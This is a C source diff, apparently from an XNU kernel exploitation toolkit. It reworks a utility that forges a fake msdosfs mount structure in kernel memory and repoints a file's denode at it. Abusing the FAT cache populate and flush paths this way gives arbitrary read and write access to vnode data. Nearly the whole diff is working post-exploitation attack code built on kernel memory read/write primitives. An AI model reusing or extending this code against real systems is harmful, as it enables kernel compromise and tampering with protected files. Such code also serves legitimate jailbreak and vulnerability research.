@@ -10,6 +10,7 @@
 #include <sys/fcntl.h>
 
 #include "util/vnode.h"
+#include "util/pipe.h"
 #include "util/msdosfs.h"
 #include "util/log.h"
 #include "util/assert.h"
@@ -64,6 +65,8 @@ struct xe_util_vnode {
     int cctl_fd;
     uintptr_t msdosfs_mount;
     uintptr_t cctl_denode;
+    xe_util_pipe_t fake_mount_pipe;
+    char msdosfs_mount_backup[TYPE_MSDOSFSMOUNT_SIZE];
 };
 
 
@@ -91,18 +94,29 @@ xe_util_vnode_t xe_util_vnode_create(void) {
     int cctl_fd = open(buffer, O_RDONLY);
     xe_assert(cctl_fd >= 0);
     
-    /// Store the address of `struct denode` associated with the `cctl_fd`
+    /// Create a fake `struct msdosfsmount`
+    xe_util_pipe_t fake_mount = xe_util_pipe_create(TYPE_MSDOSFSMOUNT_SIZE);
+    xe_kmem_copy(xe_util_pipe_get_address(fake_mount), msdosfs_mount, TYPE_MSDOSFSMOUNT_SIZE);
+    
     uintptr_t cctl_vnode;
     error = xe_xnu_proc_find_fd_data(proc, cctl_fd, &cctl_vnode);
     xe_assert_err(error);
     uintptr_t cctl_dep = xe_kmem_read_ptr(cctl_vnode, TYPE_VNODE_MEM_VN_DATA_OFFSET);
     xe_assert_cond(xe_kmem_read_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
+    /// Instead of directly changing the actual `struct msdosfsmount`, we will create a fake
+    /// `struct msdosfsmount` and set the member `de_pmp` of the `struct denode` of the `cctl_fd`.
+    /// This will only make FS operations on `cctl_fd` to use this fake mount. This is done to
+    /// prevent the background thread `pm_sync_timer` started by `msdosfs.kext` when the file
+    /// system is mounted, from interfering with the changed FAT vnode and cache
+    xe_kmem_write_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, xe_util_pipe_get_address(fake_mount));
     
     xe_util_vnode_t util = malloc(sizeof(struct xe_util_vnode));
     util->msdosfs_util = msdosfs_util;
     util->cctl_fd = cctl_fd;
     util->msdosfs_mount = msdosfs_mount;
     util->cctl_denode = cctl_dep;
+    util->fake_mount_pipe = fake_mount;
+    xe_kmem_read(util->msdosfs_mount_backup, msdosfs_mount, 0, sizeof(util->msdosfs_mount_backup));
     
     return util;
 }
@@ -135,19 +149,9 @@ void xe_util_vnode_populate_cache(xe_util_vnode_t util) {
     xe_assert(errno == EIO || errno == E2BIG);
 }
 
-void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
-    xe_assert_cond(size, <=, UINT32_MAX);
-    
-    /// Temporary storage for `dst` data in kernel memory
-    uintptr_t temp_mem;
-    xe_allocator_small_mem_t temp_mem_allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
-    
-    /// Memory for fake `struct msdosfsmount`
-    uintptr_t fake_msdosfs;
-    xe_allocator_small_mem_t fake_msdosfs_allocator = xe_allocator_small_mem_allocate(TYPE_MSDOSFSMOUNT_SIZE, &fake_msdosfs);
-    
+void xe_util_vnode_read_kernel(xe_util_vnode_t util, uintptr_t vnode, uintptr_t dst, size_t size) {
     char mount[TYPE_MSDOSFSMOUNT_SIZE];
-    xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
+    memcpy(mount, util->msdosfs_mount_backup, sizeof(mount));
     
     uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
     uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
@@ -157,7 +161,7 @@ void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t
     uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
     
     /// Location in kernel memory for storing data read from vnode
-    *pm_fat_cache = temp_mem;
+    *pm_fat_cache = dst;
     /// Required for populating FAT cache
     *pm_fat_cache_offset = INT32_MAX;
     /// Amount of data to be read from vnode
@@ -171,39 +175,27 @@ void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t
     /// Vnode from which data is to be read
     *pm_fat_active_vp = vnode;
     
-    /// Instead of directly changing these values in the actual `struct msdosfsmount`, we will
-    /// create a fake `struct msdosfsmount` with these values and set the member `de_pmp`
-    /// of the `struct denode` of the `cctl_fd`. This will only make FS operations on `cctl_fd` to
-    /// use this fake mount. This is done to prevent the background thread `pm_sync_timer`
-    /// started by `msdosfs.kext` when the file system is mounted, from using these updated
-    /// values and causing a kernel panic
-    xe_kmem_write(fake_msdosfs, 0, mount, sizeof(mount));
-    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, fake_msdosfs);
+    /// Update fake_mount associated to `cctl_fd`
+    xe_util_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
     
-    /// Trigger cache populate
+    /// Use `cctl_fd` to trigger FAT cache populate
     xe_util_vnode_populate_cache(util);
-    
-    /// Restore mount of `cctl_fd`
-    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
-    
-    /// Read the vnode data from kernel memory to `dst`
-    xe_kmem_read(dst, temp_mem, 0, size);
-    
-    xe_allocator_small_mem_destroy(&temp_mem_allocator);
-    xe_allocator_small_mem_destroy(&fake_msdosfs_allocator);
 }
 
-void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
-    /// Copy `src` data from user land to kernel memory
-    uintptr_t temp_mem;
-    xe_allocator_small_mem_t temp_mem_allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
-    xe_kmem_write(temp_mem, 0, (void*)src, size);
-    
-    uintptr_t fake_msdosfs;
-    xe_allocator_small_mem_t fake_msdosfs_allocator = xe_allocator_small_mem_allocate(TYPE_MSDOSFSMOUNT_SIZE, &fake_msdosfs);
-    
+void xe_util_vnode_read_user(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
+    xe_assert_cond(size, <=, UINT32_MAX);
+    /// Temporary storage for `dst` data in kernel memory
+    uintptr_t buffer;
+    xe_allocator_small_mem_t buffer_alloc = xe_allocator_small_mem_allocate(size, &buffer);
+    xe_util_vnode_read_kernel(util, vnode, buffer, size);
+    /// Read the vnode data from kernel memory to `dst`
+    xe_kmem_read(dst, buffer, 0, size);
+    xe_allocator_small_mem_destroy(&buffer_alloc);
+}
+
+void xe_util_vnode_write_kernel(xe_util_vnode_t util, uintptr_t vnode, uintptr_t src, size_t size) {
     char mount[TYPE_MSDOSFSMOUNT_SIZE];
-    xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
+    memcpy(mount, util->msdosfs_mount_backup, sizeof(mount));
     
     uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
     uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
@@ -214,7 +206,7 @@ void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src,
     uint64_t* pm_sync_timer = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
     
     /// Location in kernel memory containing data to be written
-    *pm_fat_cache = temp_mem;
+    *pm_fat_cache = src;
     /// Make sure we start writing from the start of vnode
     *pm_fat_cache_offset = 0;
     /// Write data size
@@ -229,13 +221,17 @@ void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src,
     /// `msdosfs_meta_flush_internal` will be called
     *pm_sync_timer = 0;
     
-    xe_kmem_write(fake_msdosfs, 0, mount, sizeof(mount));
-    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, fake_msdosfs);
+    xe_util_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
     xe_util_vnode_flush_cache(util);
-    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
-    
-    xe_allocator_small_mem_destroy(&temp_mem_allocator);
-    xe_allocator_small_mem_destroy(&fake_msdosfs_allocator);
+}
+
+void xe_util_vnode_write_user(xe_util_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
+    /// Copy `src` data from user land to kernel memory
+    uintptr_t buffer;
+    xe_allocator_small_mem_t buffer_alloc = xe_allocator_small_mem_allocate(size, &buffer);
+    xe_kmem_write(buffer, 0, (void*)src, size);
+    xe_util_vnode_write_kernel(util, vnode, buffer, size);
+    xe_allocator_small_mem_destroy(&buffer_alloc);
 }
 
 void xe_util_vnode_destroy(xe_util_vnode_t* util_p) {
@@ -243,6 +239,7 @@ void xe_util_vnode_destroy(xe_util_vnode_t* util_p) {
     xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
     close(util->cctl_fd);
     xe_util_msdosfs_unmount(&util->msdosfs_util);
+    xe_util_pipe_destroy(&util->fake_mount_pipe);
     free(util);
     *util_p = NULL;
 }
